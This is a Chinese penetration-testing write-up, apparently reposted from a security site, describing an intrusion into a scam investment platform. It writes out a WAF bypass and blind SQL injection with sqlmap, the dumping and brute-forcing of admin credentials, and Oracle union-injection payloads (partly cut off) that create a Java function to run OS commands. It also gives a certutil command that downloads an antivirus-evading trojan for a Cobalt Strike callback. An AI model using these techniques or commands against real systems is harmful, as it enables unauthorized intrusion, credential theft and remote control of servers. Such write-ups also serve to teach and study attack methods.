记⼀次渗透之路
-
安全脉搏
SecPulse.COM |
“ 这是 酒仙桥六号部队 的第 98 篇⽂章。
背景
前不久，同学短信收到⼀条⽇赚百万的短信，在强⼤的诱
惑下没忍住点了进去，开始⾛上⼀条不归路。最后差点泡
⾯都吃不起了，作为⼀个有正义感的我，也只能开始磨
⼑，看能否避免后⼈继续沦陷。
正⽂
获取后台权限
通过提供的 app，抓包获取到⼀个链接，先浏览下，是
⼀个会员登录⼝：
抓包尝试爆破下，验证码⽆法绕过，先放着。开始信息收
集⼀波，找真实 ip，c 段扫描，端⼝扫描，google 查询
等等，⼀顿操作猛如⻁，然⽽却没什么⽤，都是同模板站
点。还是继续尝试，翻翻看 fofa，找到⼏个 dede 搭建
的⽹站。
就先去看看这个 dede 的⽹站，先看下版本。
尝试了 member ⽬录，dede ⽬录等等都已删除，尝试
过后台⽬录爆破，公开漏洞等，也是失败。
那就继续翻⼀下 fofa，看能否有其他发现。翻看多⻚后
发现⼀个后台系统了。
访问看看，是⼀个登录⼝，且有 google auth 验证。
尝试使⽤ admin 进⾏弱⼝令爆破，未果。尝试⼈名的弱
⼝令，也都进不去，怀疑账号可能存在 google 安全码，
爆破成功也⽆法进⼊。
由于登录⼝存在多个版本，猜测后台可能也不⽌⼀个。通
过后台系统的关键字，继续查找，找到 60 条记录，有多
个版本的后台。
挑选最早的⼀个后台版本，再尝试⼀下爆破，还是没任何
成果。既然有了后台，按照常规套路肯定还是需要⼀个注
⼊。开始动⼿寻找，测试后台功能和 api 接⼝都未发现
漏洞。想到会员登录⼝还没有具体测试过，回头继续看
看。但是没有账号，访问 register.html 能直接注册，且
不需要填写⼿机和身份认证等。注册后开始进⾏测试，发
现⽹站存在 waf，对常规的注⼊关键词进⾏了过滤，最
后在⼀个搜索框中，发现⽇期的字段疑似存在盲注漏洞。
测试了⼀下，过滤了 select、= 等关键字，尝试 change
body encoding，能直接绕过 waf。
那接下来就简单了，直接上 sqlmap，由于只能进⾏盲
注，获取速度较慢，先获取了⼀个 admin 账号的信息。
但由于有 google auth 的存在，还不⼀定能登录，拿到
密码后是明⽂的，不需要破解，尝试后直接跳转百度。
只能把管理员表的所有账号获取到，在批量测试⼀下。获
取到所有⽤户后，使⽤ burp 的爆破功能进⾏批量测试，
发现只存在⼀个账号可进⾏登录。但并不是所有后台都能
登录，不同版本的会员功能需重新获取管理员密码。到此
可登录后台系统了。
获取 shell 权限
进⼊后台后，寻找能获取 shell 的点。查看了⼤部分功
能，都未有上传功能。在通知功能处，存在 fckeditor
2.6.4 编辑器。
test.html 测试⻚⾯已被删除，那就本地下载⼀套，修改
test.html ⻚⾯⾥的路径为 web 路径，可获取⽬录信息，
但尝试任意⽂件上传漏洞失败。
由于未寻找到其他可利⽤的漏洞，且在测试过程中发现⽤
户查找功能存在 sql 联合注⼊，有回显执⾏更为⽅便。因
此，要权限⾜够的话，可尝试 oracle 的命令执⾏去获取
权限。
但由于存在 waf，未能绕过 select 的关键词。因此尝试
其他系统，说不定早期的系统防护相对弱⼀点。因⽽挑出
最早的系统开始进⾏测试，果然没有对关键词过滤，可直
接注⼊。
先开始收集信息，⾸先查看版本，执⾏：
select banner from v$version where banner like 'Oracle
oracle 版本为 11.2.0.1，是可以执⾏命令的。继续查看权
限，执⾏：
select role from session_roles
权限为 DBA 权限：
开始创建 JAVA Source，执⾏：
UNION ALL SELECT dbms_xmlquery.newcontext('declare PRA
查看是否创建成功的命令：
select OWNER,OBJECT_NAME,OBJECT_TYPE from all_objects
接下来是 Java 赋执⾏权限，但是此之前我们需要先给⽤
户添加 java 运⾏权限，因此先执⾏：
NION ALL SELECT dbms_xmlquery.newcontext('declare PRA
再执⾏：
UNION ALL SELECT dbms_xmlquery.newcontext('declare PR
最后创建执⾏函数，执⾏ LINXRUNCMD：
UNION ALL SELECT dbms_xmlquery.newcontext('declare PR
验证函数是否创建成功：
select OBJECT_ID from all_objects where object_name ='
最后调⽤函数执⾏命令：
select LinxRunCMD('whoami') from dual
权限为 system，因此可以下载免杀⽊⻢，直接 cs 上
线。使⽤以下命令下载⽊⻢：
certutil -urlcache -split -f http://127.0.0.1/1.exe C:
运⾏⽊⻢，cs 收到反弹的权限：
由于是 server 2012 的服务器，未能获取到明⽂密码。
总结
此次的渗透，可以说是相对⽐较幸运，由于 waf 的较
弱，⽐较容易绕过。通过注⼊获取数据后，刚好有⼀个管
理员账号未设置验证，能够登录后台。通过多个后台权
限，寻找防护较弱的后台进⾏ oracle 联合注⼊，执⾏命
令获取主机权限。但由于后续被管理员发现，可能流量存
在异常或者⽊⻢被查杀，未能继续进⾏内⽹探索。相关成
果已移交。
全⽂完
本⽂由 简悦 SimpRead 优化，⽤以提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看详细说明